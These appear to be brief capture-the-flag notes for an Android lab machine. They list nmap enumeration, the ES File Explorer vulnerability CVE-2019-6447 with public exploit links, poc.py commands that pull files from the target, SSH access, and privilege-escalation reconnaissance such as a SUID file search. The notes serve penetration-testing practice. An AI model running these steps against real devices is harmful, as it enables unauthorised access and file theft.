OS: Android
IP: 10.10.10.247

###Skills learned:
ssh port forwarding
Andriod OS + tools

###Enum
nmap -p- -A -oN Exploreprts.txt ${IP}
+ 2222 SimplSSH
+ 5555 Andriod Debug bridge
+ 42135 ES File explorer
+ 59777 Bukkit JSONAPI
+ 44233 fingerprint-strings

###Search
Yields CVE-2019-6447
+ https://github.com/fs0c131y/ESFileExplorerOpenPortVuln
+ https://www.exploit-db.com/exploits/50070

###Step 1
+python3 poc.py ${cmd} ${IP} 
+ python3 poc.py ${cmd} ${IP} $dir/$.jpg
+ [+] Done. Saved as 'out.dat'.

Now that you have downloaded the file, open the URL in a browser.
+ ${IP}:59777/$dir/$.jpg


###Step 2
+ ssh -p 2222 $UN@${IP} 
+ ${PW}

###Info gathering
+ :/whoami
u0_a76
+ :/uname -a 
Linux localhost 4.9.214-android-x86_64-g04f9324 #1 SMP PREEMPT Wed Mar 25 17:11:29 CST 2020 x86_64
+ :/find / -perm /6000 2>/dev/null
/system/xbin/procmem
/system/xbin/su
+ :/ $ id
uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768

### Find Flag
Have fun searching! 
